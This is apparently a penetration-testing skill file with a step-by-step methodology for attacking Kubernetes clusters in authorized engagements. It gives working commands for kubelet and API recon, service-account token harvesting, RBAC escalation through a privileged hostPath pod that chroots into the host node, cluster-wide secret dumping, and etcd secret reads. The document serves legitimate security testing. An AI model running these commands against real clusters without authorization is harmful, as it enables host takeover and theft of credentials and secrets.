---
name: kubernetes-attack
description: >
  Kubernetes cluster attack methodology for authorized engagements: API
  server access and auth bypass, RBAC enumeration/bypass, pod escape to
  host, secrets extraction, etcd abuse. Keywords: Kubernetes, k8s, kubelet,
  API server, RBAC, pod escape, service account token, etcd, container
  breakout, kube-hunter, kube-bench. Do NOT use for a single Docker
  container without an orchestrator (see docker-attack), or for cloud
  provider IAM around a managed cluster — e.g. EKS node IAM role abuse is
  aws-attack, GKE Workload Identity is gcp-attack; this skill covers the
  k8s-native control plane.
metadata:
  type: platform
  phase: hunting
  tools: [kubectl, kube-hunter, kube-bench, peirates, kubeletctl, trivy]
depends_on: [docker-attack, network-infra]
feeds_into: [chain-analysis, privesc-report]
chains_with: [docker-attack, aws-attack, gcp-attack, azure-attack, linux-privesc]
---

## Signals
- Exposed API server port (6443/TCP) or kubelet API (10250/TCP) reachable from tested network segment.
- A pod/container foothold with a mounted service account token (`/var/run/secrets/kubernetes.io/serviceaccount/token`).
- Dashboard exposed without auth (`:9090` or `:8001` on older insecure deployments).
- `.kube/config` leaked in repos, CI artifacts, or backups.

## Prerequisites
- Written authorization explicitly naming the cluster(s)/namespace(s) in scope — pod escape and node compromise affect shared infra, so scope precision matters more here than almost anywhere else.
- Network reachability to the API server or kubelet, or a shell inside any pod.
- `kubectl`, `kube-hunter`, `peirates`, `kubeletctl` installed.

## Methodology

### 1. Unauthenticated / anonymous recon
```bash
kube-hunter --remote target-cluster.com
curl -sk https://target-k8s-api:6443/version
curl -sk https://target-k8s-api:6443/api/v1/namespaces --header "Authorization: Bearer "   # anonymous auth check
```

### 2. Kubelet API abuse (often unauthenticated on misconfigured nodes)
```bash
kubeletctl -i scan 10.10.10.0/24
kubeletctl pods -s 10.10.10.5
kubeletctl exec "id" -p target-pod -c target-container -s 10.10.10.5
```

### 3. From inside a pod: harvest the service account token
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

### 4. RBAC enumeration with the harvested token
```bash
kubectl auth can-i --list --token=$TOKEN --server=https://kubernetes.default.svc --certificate-authority=$CACERT
kubectl auth can-i create pods --token=$TOKEN -n kube-system
# Automated: peirates will walk RBAC automatically once a token is loaded
peirates
```

### 5. RBAC bypass / privesc paths
```bash
# create pods + no PSP/PSA restriction -> escape to host via hostPath mount
kubectl --token=$TOKEN apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: pwn-pod
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["sleep", "999999"]
    volumeMounts:
    - mountPath: /host
      name: host-root
    securityContext:
      privileged: true
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF
kubectl exec -it pwn-pod -- chroot /host /bin/sh
```

### 6. Secrets extraction
```bash
kubectl --token=$TOKEN get secrets -A
kubectl --token=$TOKEN get secret target-secret -n default -o jsonpath='{.data}' | base64 -d
```

### 7. etcd abuse (if reachable directly, 2379/TCP, no TLS client auth)
```bash
ETCDCTL_API=3 etcdctl --endpoints=https://10.10.10.5:2379 get / --prefix --keys-only
ETCDCTL_API=3 etcdctl --endpoints=https://10.10.10.5:2379 get /registry/secrets/default/target-secret
```

### 8. Pod escape via privileged container / dangerous capabilities
```bash
# Check current container's capabilities and mounts
capsh --print
mount | grep -i docker
cat /proc/self/status | grep Cap
# If CAP_SYS_ADMIN or privileged=true, escape via cgroup release_agent technique or nsenter
```

### 9. CronJob / admission controller abuse
```bash
kubectl --token=$TOKEN get cronjobs -A
kubectl --token=$TOKEN get mutatingwebhookconfigurations,validatingwebhookconfigurations
```

## Tooling
`kubectl`, `kube-hunter`, `kube-bench` (CIS benchmark, for config review), `peirates`, `kubeletctl`, `trivy` (image scanning), `kubeaudit`.

## Validation Gate
- Pod escape must be demonstrated by actually reading a host-side file or running a host-context command from inside the escaped container, not just citing `privileged: true` in a manifest.
- RBAC privesc path confirmed via `kubectl auth can-i` must be executed (the actual verb/resource combination performed) before reporting impact.
- Record cluster version, RBAC policy dump, and the exact pod spec/manifest used for any escape as evidence.

## Gotchas
- Creating a privileged pod on a shared multi-tenant cluster can affect other tenants' workloads on the same node — this is a human gate per project rules even when technically in scope ("acciones destructivas o irreversibles" / "modifiquen estado del target").
- Pod Security Admission (PSA) or OPA/Gatekeeper policies may silently reject the privileged pod manifest — check the API response, don't assume success.
- Managed clusters (EKS/GKE/AKS) often lock down direct etcd and kubelet access by default — this class is most relevant to self-managed/on-prem k8s.
- A service account token's actual permissions can differ wildly by namespace — always re-run `auth can-i --list` per-namespace, not just cluster-wide.
- Clean up any test pods/resources created during the engagement before closing out.
